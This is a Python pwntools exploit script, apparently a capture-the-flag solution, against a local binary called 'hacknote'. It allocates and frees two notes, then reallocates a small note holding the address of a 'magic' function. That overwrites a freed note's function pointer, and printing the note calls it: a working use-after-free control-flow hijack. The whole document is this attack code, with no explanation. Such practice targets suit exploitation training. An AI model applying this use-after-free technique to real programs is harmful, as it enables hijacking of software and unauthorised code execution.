from pwn import*

context(arch='i386',os ='linux')
context.log_level = 'debug'

r = process('./hacknote')

elf = ELF('./hacknote')
magic = elf.symbols['magic']

def add_note(size,content):
    r.sendline('1')
    r.recv()
    r.sendline(str(size))
    r.recv()
    r.send(content)
    r.recv()

def delete_note(index):
    r.sendline('2')
    r.recv()
    r.sendline(str(index))
    r.recv()

def print_note(index):
    r.sendline('3')
    r.recv()
    r.sendline(str(index))
    r.recv()

    
payload = ''
payload += p32(magic)

add_note(16,"AAAA")
add_note(16,"BBBB")
delete_note(0)
delete_note(1)

add_note(8,p32(magic))

print_note(0)

r.interactive()
